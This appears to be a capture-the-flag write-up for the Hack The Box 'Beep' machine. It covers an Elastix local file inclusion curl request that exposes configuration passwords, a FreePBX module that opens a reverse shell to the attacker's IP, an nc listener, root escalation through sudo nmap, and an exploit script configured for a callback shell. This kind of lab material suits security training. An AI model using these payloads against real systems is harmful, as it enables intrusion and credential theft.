# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.7 beep.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ nmap -sT -sV -sC -Pn -p- beep.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

# Enumeration (1)

## Port 80 `Apache httpd 2.2.3`

![](/assets/images/beep1.png)

We are immediately presented with a login page to `Elastix`. Trying the default crendentials `admin:admin` did not work so lets see if there are any working exploits we can use.

```bash
$ searchsploit elastix
------------------------------------------------------------------- ---------------------------------

FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution             | php/webapps/18650.py
------------------------------------------------------------------- ---------------------------------
```

If we check out the `Elastix 2.2.0 - 'graph.php' Local File Inclusion` vulnerability, it says that by browsing to `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`, we will be able to read `/etc/amportal.conf` which contains some confidential config parameters.

```bash
$ curl -k "https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
...
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

...

#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

...

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

It seems that the credentials are `admin:jEhdIekWmdjE`. 

![](/assets/images/beep2.png)

On the top right there was a button that allowed us to view the version of the packages installed.

![](/assets/images/beep3.png)

We see that `freePBX` is installed. We can use it to install a module that executes a `php` reverse shell. However, to upload it, we will need to figure out where was `freePBX`'s Administrative Panel located in the server. I found a [thread](https://community.freepbx.org/t/freepbx-administration-login/17413) talking about it and when I visited `/admin`, we are prompted for credentials.

![](/assets/images/beep4.png)

The credentials that we found worked and we can now carry out the exploit.

# Exploitation (1)

There was a ready-to-use package we can use from [here](https://github.com/SamSepiolProxy/FreePBX-Reverse-Shell-Module). After cloning it, we update the `install.php` file to contain our IP address and a port of our choice and proceed to package it altogether.

```bash
$ git clone https://github.com/SamSepiolProxy/FreePBX-Reverse-Shell-Module
$ cd FreePBX-Reverse-Shell-Module
$ cat shell/install.php
...
$ip = '10.10.X.X';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
...
$ tar -cvzf shell-1.0.tar.gz shell
```

Going under `Admin` > `Module Admin`, we see there is a button that says `Upload Module`.

![](/assets/images/beep5.png)

Proceed to upload the `shell-1.0.tar.gz` and then return to `Module Admin` again and click on `shell`. There, we can select `Install` to install the module.

![](/assets/images/beep6.png)

We are not done yet. We will need to press on `Process` found on the top right. 

![](/assets/images/beep7.png)

After a while it will ask to confirm the installation and we hit `Confirm`.

![](/assets/images/beep8.png)

A orange square will appear and we will receive a connection on our `nc` listener that we setup beforehand.

```bash
$ sudo rlwrap nc -lvnp 1337

# user.txt

The user flag is located in the home directory of the `faris` user.

```bash
sh-3.2$  cat /home/fanis/user.txt
fd86XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

Checking the `sudo` rights of the current user, we see that we have a whole list of commands we can run as `root`!

```bash
sh-3.2$ sudo -l

    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR

    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

# Exploitation (2)

I chose to use `nmap`, because I knew I could escape to a shell according to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).

```bash
sh-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )

!sh
python -c "import pty; pty.spawn('/bin/bash')"
bash-3.2#  id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

# root.txt

The root flag is located at `/root` as always.

```bash
bash-3.2# cat /root/root.txt
d279XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !

# Extra

Back in our enumeration, we see that the version of `Elastix` that is installed is `2.2.0` and the version of `freePBX` that was installed is `2.8.1`. Hence the `FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution` from the `searchsploit` results should work. However, it was only after reading other people's writeups, I realised that I needed to modify the `extension` value in the script. 

```bash
$ cat 18650.py
...
import requests

rhost="10.10.10.7"
lhost="10.10.XX.XX"
lport=1337
extension="1000"
...
```

This number can be changed to any number, hence brute-forcing it might work. However, since we already logged into `Elastix`, we can actually see the `extension` number that we are supposed to use by going to `PBX` > `PBX Configuration` > `Basic` > `Extensions`.

![](/assets/images/beep9.png)

In this case, the number was `233`. After changing the `extension` in the script to `233` and executing it again,

```bash
$ sudo rlwrap nc -lvnp 1337
[sudo] password for kali: 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.7] 43564
python -c "import pty; pty.spawn('/bin/bash')"
id
uid=100(asterisk) gid=101(asterisk)
```

We got a shell as `asterisk` on our `nc` listener that we setup beforehand!
